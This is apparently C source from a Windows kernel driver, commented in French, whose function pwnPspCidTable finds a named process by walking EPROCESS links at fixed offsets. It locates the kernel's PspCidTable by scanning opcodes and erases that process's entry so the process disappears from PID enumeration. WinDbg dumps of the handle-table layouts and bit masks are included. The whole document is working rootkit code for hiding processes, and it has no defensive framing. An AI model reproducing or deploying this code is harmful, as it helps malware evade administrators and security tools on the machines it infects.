int pwnPspCidTable(int trampoline , char* processus)
{
    PUCHAR              tmp;
    PHANDLE_TABLE_      pspCidTable = 0;
    PULONG              pObject, object2Hide , tableCode ;
    PHANDLE_TABLE_ENTRY pHandleTableEntry;
    int                 i , j , k;
    PEPROCESS           pEprocessCourante;
    PLIST_ENTRY         lcCourante;
    ULONG               valeurDebut;

    pEprocessCourante = IoGetCurrentProcess();
    valeurDebut = (ULONG)pEprocessCourante;
    do
    {
        if(strncmp(processus , (PUCHAR)pEprocessCourante + 0x174 , strlen(processus)) == 0)
            break;

        lcCourante = (PLIST_ENTRY)((PUCHAR)pEprocessCourante + 0x88);    //   +0x088 ActiveProcessLinks : _LIST_ENTRY
        pEprocessCourante = (PEPROCESS)((PUCHAR)lcCourante->Flink - 0x88);

    }while((ULONG)pEprocessCourante != valeurDebut);

    if((ULONG)pEprocessCourante == valeurDebut)
            return 0;

    object2Hide = (PULONG)pEprocessCourante;
    tmp = (PUCHAR)*(PULONG)(*(PULONG)((PUCHAR)PsLookupProcessByProcessId + 2)); //f7aa297e ff25902baaf7    jmp     dword ptr [D3pths!_imp__PsLookupProcessByProcessId (f7aa2b90)]

    /*
    lkd> dt nt!_HANDLE_TABLE
   +0x000 TableCode        : Uint4B
   +0x004 QuotaProcess     : Ptr32 _EPROCESS
   +0x008 UniqueProcessId  : Ptr32 Void
   +0x00c HandleTableLock  : [4] _EX_PUSH_LOCK
   +0x01c HandleTableList  : _LIST_ENTRY
   +0x024 HandleContentionEvent : _EX_PUSH_LOCK
   +0x028 DebugInfo        : Ptr32 _HANDLE_TRACE_DEBUG_INFO
   +0x02c ExtraInfoPages   : Int4B
   +0x030 FirstFree        : Uint4B
   +0x034 LastFree         : Uint4B
   +0x038 NextHandleNeedingPool : Uint4B
   +0x03c HandleCount      : Int4B
   +0x040 Flags            : Uint4B
   +0x040 StrictFIFO       : Pos 0, 1 Bit

   kd> dt nt!_HANDLE_TABLE_ENTRY
   +0x000 Object           : Ptr32 Void
   +0x000 ObAttributes     : Uint4B
   +0x000 InfoTable        : Ptr32 _HANDLE_TABLE_ENTRY_INFO
   +0x000 Value            : Uint4B
   +0x004 GrantedAccess    : Uint4B
   +0x004 GrantedAccessIndex : Uint2B
   +0x006 CreatorBackTraceIndex : Uint2B
   +0x004 NextFreeTableEntry : Int4B
   Sizeof = 8
   */

   /*
   Elaboration du masque :
    -Premier bit doit être à 1 car nous sommes dans le noyaux donc > 0x80000000.
    -Recuperer les 29 premiers bits, et mettre les 3 autres à 0.

    kd> dd nt!PspCidTable
        80560ce0  e1001850 00000002 00000000 00000000
    kd> dt nt!_HANDLE_TABLE 0xe1001850
    +0x000 TableCode        : 0xe1003000
    +0x004 QuotaProcess     : (null)
    +0x008 UniqueProcessId  : (null)
    +0x00c HandleTableLock  : [4] _EX_PUSH_LOCK
    +0x01c HandleTableList  : _LIST_ENTRY [ 0xe100186c - 0xe100186c ]
    +0x024 HandleContentionEvent : _EX_PUSH_LOCK
    +0x028 DebugInfo        : (null)
    +0x02c ExtraInfoPages   : 0
    +0x030 FirstFree        : 0xd8
    +0x034 LastFree         : 0x1e4
    +0x038 NextHandleNeedingPool : 0x800
    +0x03c HandleCount      : 251
    +0x040 Flags            : 1
    +0x040 StrictFIFO       : 0y1
    kd> dd 0xe1003000
        e1003000  00000000 fffffffe 817cc7c1 00000000
        e1003010  817cc549 00000000 817cc101 00000000
        e1003020  817cbda9 00000000 817cbb31 00000000
        e1003030  817cb8b9 00000000 817cb641 00000000
        e1003040  817cb3c9 00000000 817cb151 00000000
        e1003050  817ca021 00000000 817cada9 00000000
        e1003060  817cab31 00000000 817ca8b9 00000000
        e1003070  817ca641 00000000 817ca3c9 00000000

    817cc7c1 = 10000001011111001100011111000001

        10000001011111001100011111000001
    OU
        10000000000000000000000000000000
    =   10000001011111001100011111000001

        10000001011111001100011111000001
    ET
        11111111111111111111111111111000
    =   10000001011111001100011111000000

    kd> !object 0x817CC7C0
        Object: 817cc7c0  Type: (817cce38) Process
        ObjectHeader: 817cc7a8 (old version)
        HandleCount: 2  PointerCount: 51
    kd> dt nt!_EPROCESS 0x817cc7c0
    +0x000 Pcb              : _KPROCESS
    +0x06c ProcessLock      : _EX_PUSH_LOCK
    +0x070 CreateTime       : _LARGE_INTEGER 0x0
    +0x078 ExitTime         : _LARGE_INTEGER 0x0
    +0x080 RundownProtect   : _EX_RUNDOWN_REF
    +0x084 UniqueProcessId  : 0x00000004
    +0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x81609888 - 0x80560bd8 ]
    +0x090 QuotaUsage       : [3] 0
    +0x09c QuotaPeak        : [3] 0
    +0x0a8 CommitCharge     : 7
    +0x0ac PeakVirtualSize  : 0x29e000
    +0x0b0 VirtualSize      : 0x1dc000
    +0x0b4 SessionProcessLinks : _LIST_ENTRY [ 0x0 - 0x0 ]
    +0x0bc DebugPort        : (null)
    +0x0c0 ExceptionPort    : (null)
    +0x0c4 ObjectTable      : 0xe1001cb0 _HANDLE_TABLE
    +0x0c8 Token            : _EX_FAST_REF
    +0x0cc WorkingSetLock   : _FAST_MUTEX
    +0x0ec WorkingSetPage   : 0
    +0x0f0 AddressCreationLock : _FAST_MUTEX
    +0x110 HyperSpaceLock   : 0
    +0x114 ForkInProgress   : (null)
    +0x118 HardwareTrigger  : 0
    +0x11c VadRoot          : 0x817c5d60
    +0x120 VadHint          : 0x817c5d60
    +0x124 CloneRoot        : (null)
    +0x128 NumberOfPrivatePages : 3
    +0x12c NumberOfLockedPages : 0
    +0x130 Win32Process     : (null)
    +0x134 Job              : (null)
    +0x138 SectionObject    : (null)
    +0x13c SectionBaseAddress : (null)
    +0x140 QuotaBlock       : 0x80560c80 _EPROCESS_QUOTA_BLOCK
    +0x144 WorkingSetWatch  : (null)
    +0x148 Win32WindowStation : (null)
    +0x14c InheritedFromUniqueProcessId : (null)
    +0x150 LdtInformation   : (null)
    +0x154 VadFreeHint      : (null)
    +0x158 VdmObjects       : (null)
    +0x15c DeviceMap        : 0xe10000d0
    +0x160 PhysicalVadList  : _LIST_ENTRY [ 0x817cc920 - 0x817cc920 ]
    +0x168 PageDirectoryPte : _HARDWARE_PTE
    +0x168 Filler           : 0
    +0x170 Session          : (null)
    +0x174 ImageFileName    : [16]  "System" <- c bien notre processus !:]]]

    PtrObject = ((x | 0x80000000) & 0xfffffff8 );


    Recuperons le level de la table now :

        817cc7c1 = 10000001011111001100011111000001

        10000001011111001100011111000001
    ET
        00000000000000000000000000000011
    =   00000000000000000000000000000001

    */

    for( i = 0 ; i < 100 ; i++ )
    {
        if( (*(tmp+i) == 0xFF) && (*(tmp+i+1) == 0x35) && (*(tmp+i+6) == 0xE8) )
        {
            if(trampoline == 1)
                pspCidTable = (PHANDLE_TABLE_)(*(PULONG)(*(PULONG)(tmp+i+2)));//8057473d ff35e00c5680    push    dword ptr [nt!PspCidTable (80560ce0)]
            else
                pspCidTable = (PHANDLE_TABLE_)(*(PULONG)(tmp+i+2));
        }
    }
    if(pspCidTable == 0)
        return 0;

    tableCode = (PULONG)((pspCidTable->TableCode | 0x80000000)&0xfffffff8);
    switch(*(PULONG)pspCidTable & 0x00000003)
    {
        case 0: //table de niveau 0, TableCode pointe vers une entrée de la handle table.
        {
            DbgPrint("Level 0.");
            pHandleTableEntry = (PHANDLE_TABLE_ENTRY)tableCode;

            DbgPrint("Object(%x) : %x" ,&(pHandleTableEntry[ (*(PULONG)((PUCHAR)pEprocessCourante+0x084)) / 4 ]).Object  , (pHandleTableEntry[ (*(PULONG)((PUCHAR)pEprocessCourante+0x084)) / 4 ]).Object );   //+0x084 UniqueProcessId  : Ptr32 Void ; les pids sont des multiples de 4, autrement dit le premier est 4, la première entrée
            (pHandleTableEntry[ (*(PULONG)((PUCHAR)pEprocessCourante+0x084)) / 4 ]).Object = 0; //Le pid est l'indice dans la pspCidTable de l'entrée de l'objet EPROCESS
            break;
        }

        case 1: //table de niveau 1, TableCode pointe vers un tableau de pointeur sur les entrées.
        {
            DbgPrint("Level1");
            for( i = 0 ; i < 0x1000 ; i++ )
            {
                if(*tableCode)
                {
                    pHandleTableEntry = (PHANDLE_TABLE_ENTRY)*tableCode;
                    for( j = 0 ; j < 0x1000/sizeof(HANDLE_TABLE_ENTRY) ; j++ )
                    {
                        pObject = (PULONG)(( (ULONG)pHandleTableEntry->Object | 0x80000000)& 0xfffffff8);

                        if( pObject == object2Hide )
                            *(PULONG)(&pHandleTableEntry->Object) = 0;

                        pHandleTableEntry++;
                    }
                }
                tableCode++;
            }
            break;
        }

        case 2://Table de niveau 2, Table code faire vers tableau de tableau de pointeur sur les entrées.
            DbgPrint("Level 2");
            for( i = 0 ; i < 0x1000 ; i++ )
            {
                if(*tableCode)
                {
                    for( j = 0 ; j < 0x1000 ; j++ )
                    {
                        if( *(PULONG*)(*tableCode) )
                        {
                            pHandleTableEntry = (PHANDLE_TABLE_ENTRY)*((PULONG)*tableCode);
                            for( k = 0 ; k < 0x1000/sizeof(HANDLE_TABLE_ENTRY) ; k++ )
                            {
                                pObject = (PULONG)(( (ULONG)pHandleTableEntry->Object | 0x80000000)& 0xfffffff8);

                                if( pObject == object2Hide )
                                    *(PULONG)(&pHandleTableEntry->Object) = 0;

                                pHandleTableEntry++;
                            }
                        }
                        (*tableCode)++;
                    }
                }
                (tableCode)++;
            }
            break;
    }

    return 1;
}
